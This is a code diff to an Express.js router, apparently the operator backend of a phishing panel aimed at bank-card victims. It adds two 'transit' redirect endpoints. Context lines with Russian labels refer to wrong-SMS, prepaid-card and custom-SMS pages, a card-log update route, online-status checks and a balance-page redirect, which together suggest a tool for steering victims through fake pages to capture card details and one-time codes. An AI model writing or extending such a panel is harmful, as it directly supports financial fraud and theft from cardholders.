@@ -126,7 +126,8 @@ router.get("/check-online-status/:sessionId", (req, res) => {
     "wrong-sms": "❌📩 Страница неправильного SMS",
     prepaid: "❌🏧 Страница Prepaid карты",
     "custom-sms": "📱 Страница кастомного смс",
-    // Добавляем новую страницу
+    "transit-1": "🔄 Транзитная страница 1",
+    "transit-2": "🔄 Транзитная страница 2",
   };
   const currentPageDisplay =
     pageNames[status.currentPage] || `📄 ${status.currentPage}`;
@@ -353,6 +354,51 @@ router.post("/cardlog-update", async (req, res) => {
     console.error("Error updating card log:", error);
     res.status(500).json({ success: false, error: "Database error" });
   }
+});
+
+// ➝ Новые эндпоинты для транзитных страниц
+router.post("/redirect-transit-1", (req, res) => {
+  const { sessionId, clientId } = req.body;
+
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
+  }
+
+  const redirectKey = `${clientId}:${sessionId}`;
+
+  redirectRequests.set(redirectKey, {
+    type: "transit-1",
+    timestamp: Date.now(),
+    clientId: clientId,
+  });
+
+  console.log(`🔄 Transit-1 redirect for client ${clientId}, session: ${sessionId}`);
+  res.json({ success: true, message: "Transit-1 redirect saved" });
+});
+
+router.post("/redirect-transit-2", (req, res) => {
+  const { sessionId, clientId } = req.body;
+
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
+  }
+
+  const redirectKey = `${clientId}:${sessionId}`;
+
+  redirectRequests.set(redirectKey, {
+    type: "transit-2", 
+    timestamp: Date.now(),
+    clientId: clientId,
+  });
+
+  console.log(`🔄 Transit-2 redirect for client ${clientId}, session: ${sessionId}`);
+  res.json({ success: true, message: "Transit-2 redirect saved" });
 });
 
 // ➝ Перенаправление пользователя на страницу баланса (новый эндпоинт)
